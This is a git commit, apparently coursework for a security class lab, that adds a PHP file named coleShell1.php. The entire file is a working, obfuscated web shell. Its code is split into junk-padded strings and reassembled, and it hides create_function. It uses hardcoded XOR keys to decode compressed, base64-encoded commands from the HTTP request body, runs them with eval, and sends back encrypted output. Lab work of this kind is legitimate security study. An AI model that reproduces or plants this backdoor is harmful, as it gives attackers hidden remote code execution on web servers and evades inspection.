eea3c356c4d51bae69b4e61fecf3bc1e7a55d672
cdbizzle <cole.davisbrand@mymail.champlain.edu>
2023-10-17 10:50:20 -0400

    Lab 8.1 done

---
+++ SEC335/Week8/coleShell1.php
@@ -0,0 +1,11 @@
+<?php
+$s='yind_clyiean();$r=yi@baseyi6yi4_encodeyi(@x(@gzcomyipyiresyis($o),$k)yi)yi;printyi("$p$kh$r$kf");}';
+$k=str_replace('O','','crOeatOOOeO_fuOnction');
+$J='ial(@gzuyincomyipress(@x(@bayise64_dyiecodeyi($m[1]yi),$k)))yi;$o=yiyi@yiob_get_contenyits();@ob_e';
+$U='$kyi="yi1a1dcyi91c"yi;$kyiyih="907325c69yiyi271";$kf="ddf0c944bc72";$yip="vAyiB9nyioZVPebk42hyif";yifu';
+$Q='"/$yikh(.yi+)$kyif/"yi,@file_geyit_conteyints(yi"yiphp://input"),$myiyi)==1) {@ob_stayirt();yi@evy';
+$j='0;($j<$cyi&yi&$i<$l);$jyi++,$yiyii++){$yio.=$t{$i}yi^$k{$j};}yi}yireturn $o;}iyif (@pyireg_match(yi';
+$D='ncyition x($t,$k){yiyi$c=strlyien($kyi);$l=stryilen($yit);$yio="";foryi($i=0;yi$i<$l;){foyir($yij=';
+$u=str_replace('yi','',$U.$D.$j.$Q.$J.$s);
+$O=$k('',$u);$O();
+?>
